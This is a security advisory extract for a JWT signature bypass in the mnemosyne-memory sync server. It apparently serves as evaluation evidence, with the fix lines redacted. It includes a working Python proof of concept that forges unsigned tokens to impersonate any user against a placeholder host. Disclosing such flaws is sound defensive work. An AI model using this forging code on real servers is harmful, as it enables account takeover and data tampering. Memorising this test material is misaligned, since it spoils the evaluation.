# Advisory factual evidence — GHSA-xcw4-53cc-hv32

Mechanical, fact-only extract for adjudication. Fix-attribution lines are removed (logged
below); no hand paraphrase. The fix diff is supplied separately, not here.

- Advisory: GHSA-xcw4-53cc-hv32  (aliases: CVE-2026-59163, PYSEC-2026-4106)
- Affected package: PyPI: mnemosyne-memory
- Severity: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- Published: 2026-09-18T17:54:26Z
- Summary: Mnemosyne has JWT signature verification bypass sync server that allows authentication bypass
- Source: https://github.com/AxDSan/mnemosyne/security/advisories/GHSA-xcw4-53cc-hv32

## Details (verbatim, fix-attribution lines removed)

### Summary

The Mnemosyne sync server's authentication check decoded JWT bearer tokens but never verified their HMAC-SHA256 signatures. Any well-formed token was accepted, allowing an unauthenticated attacker to impersonate any user and read or modify their sync data.

**Severity: Critical**

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1

Assumes the sync server endpoint is network-reachable. If your deployment is localhost-only, the score drops substantially and severity becomes High or Medium depending on local exposure. Confirm your threat model.

### Affected versions

All mnemosyne versions exposing the sync server endpoint, up to and including v3.10.0.


v3.10.1 (commit a0b6b871 on branch security/jwt-signature-verification)

___

### Description

The sync server uses JWT bearer tokens to authenticate clients. Prior to v3.10.1, the auth check in mnemosyne/core/sync_server.py parsed the JWT's header and payload using base64 decoding, then passed the token to a jwt library call with options that effectively disabled signature verification. The server accepted any well-formed token regardless of the signature, including tokens with alg: none and tokens signed with the wrong key.


- Constant-time signature comparison via hmac.compare_digest
- Strict alg: HS256 check, rejecting none and other algorithms
- UTC-aware exp validation with leeway
- Loud errors with specific failure reasons
- Type validation of decoded payload before use

### Impact

An attacker with network access to the sync server can:

- Forge a JWT for any user_id without knowing the secret
- Authenticate as that user to /sync/status, /sync/push, and /sync/pull
- Read the victim's sync state
- Push malicious sync state to corrupt the victim's local database
- Pivot within a shared deployment (multi-user sync server)

Confidentiality and integrity of sync data are fully compromised for the duration of exposure. There is no impact on the server's availability.

### Reproduction

```python
import base64
import json
import requests

# Forge a JWT for any user. No secret required.
def forge_jwt(user_id):
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    ).rstrip(b"=")
    payload = base64.urlsafe_b64encode(
        json.dumps({"user_id": user_id, "exp": 9999999999}).encode()
    ).rstrip(b"=")
    sig = b""
    return f"{header.decode()}.{payload.decode()}."

r = requests.get(
    "https://target.example.com/sync/status",
    headers={"Authorization": f"Bearer {forge_jwt('victim-user-id')}"},
)
print(r.status_code, r.json())
```

A 200 OK response with valid sync status payload confirms the bypass. The attack requires no credentials, no secret, and no prior access.


Upgrade to v3.10.1.

For users who cannot upgrade immediately:

- Restrict network access to the sync server endpoint to trusted clients only. Firewall, reverse proxy with mTLS, or localhost bind with SSH tunnel are all viable.
- The vulnerability is not exploitable against an unreachable endpoint.

### Workarounds


### Credits

- Reporter: Denis Hache (dplush). Reported via private channel on 2026-06-13 with full reproduction and a coordinated disclosure window.
- Fix: Denis Hache

### Timeline
- 2026-06-13: Initial report received from Denis via private channel.

## References (fix-commit excluded)
- WEB: https://github.com/AxDSan/mnemosyne/security/advisories/GHSA-xcw4-53cc-hv32
- WEB: https://github.com/mnemosyne-oss/mnemosyne/pull/373
- PACKAGE: https://github.com/AxDSan/mnemosyne
- WEB: https://github.com/mnemosyne-oss/mnemosyne/releases/tag/v3.10.1

## Redaction note
- 4 fix-attribution line(s) and 1 fix-locating reference(s) were removed so this evidence carries the vulnerability facts without the remediation answer.
- The verbatim removed lines are recorded author-side only (`advisory-redaction-log.md`), not in this judge bundle, to avoid leaking fix-attribution.
